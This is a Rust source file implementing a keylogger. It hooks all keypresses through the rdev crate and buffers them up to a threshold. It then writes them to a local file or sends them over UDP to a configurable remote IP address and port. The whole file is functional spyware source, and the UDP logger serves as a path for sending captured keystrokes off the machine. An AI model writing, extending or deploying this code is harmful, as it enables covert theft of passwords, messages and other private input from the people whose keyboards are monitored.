use rdev::{listen, Event, EventType};
use std::io::Write;
use std::net::IpAddr;
use std::sync::{Arc, Mutex};

pub trait Log: Send + Sync {
    fn log(&self, data: &str) -> Result<(), Box<dyn std::error::Error>>;
}

pub struct NetworkLogger {
    pub ipv4_addr: IpAddr,
    pub port: u16,
    socket: std::net::UdpSocket,
}

impl NetworkLogger {
    pub fn new(ipv4_addr: IpAddr, port: u16) -> Result<Self, std::io::Error> {
        Ok(Self {
            ipv4_addr,
            port,
            socket: std::net::UdpSocket::bind(format!("{}:{}", ipv4_addr, 0))?,
        })
    }
}

impl Log for NetworkLogger {
    fn log(&self, data: &str) -> Result<(), Box<dyn std::error::Error>> {
        self.socket
            .send_to(data.as_bytes(), (self.ipv4_addr, self.port))?;
        Ok(())
    }
}

pub struct FileLogger {
    pub recorder_file: std::path::PathBuf,
}

impl FileLogger {
    pub fn new(recorder_file: std::path::PathBuf) -> Self {
        Self { recorder_file }
    }
}

impl Log for FileLogger {
    fn log(&self, data: &str) -> Result<(), Box<dyn std::error::Error>> {
        let mut file = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&self.recorder_file)?;
        write!(file, "{}", data)?;
        Ok(())
    }
}

pub fn run(logger: Box<dyn Log>, keystroke_threshold: u32) {
    // Create a shared, thread-safe logger and key buffer instance
    let logger = Arc::new(Mutex::new(logger));
    let key_buffer = Arc::new(Mutex::new(Vec::new()));

    // Create the event listener with a closure that captures the logger
    let listener = move |event: Event| {
        if let EventType::KeyPress(key) = event.event_type {
            if let Ok(mut buffer) = key_buffer.lock() {
                buffer.push(format!("{:?}\n", key));
                if buffer.len() >= keystroke_threshold as usize {
                    if let Ok(logger) = logger.lock() {
                        if let Err(e) = logger.log(&buffer.join("")) {
                            eprintln!("error: {}", e);
                            std::process::exit(1);
                        }
                    }
                    buffer.clear();
                }
            }
        }
    };

    if let Err(e) = listen(listener) {
        eprintln!("error: failed to listen for keyboard event {:?}", e);
        std::process::exit(1);
    }
}
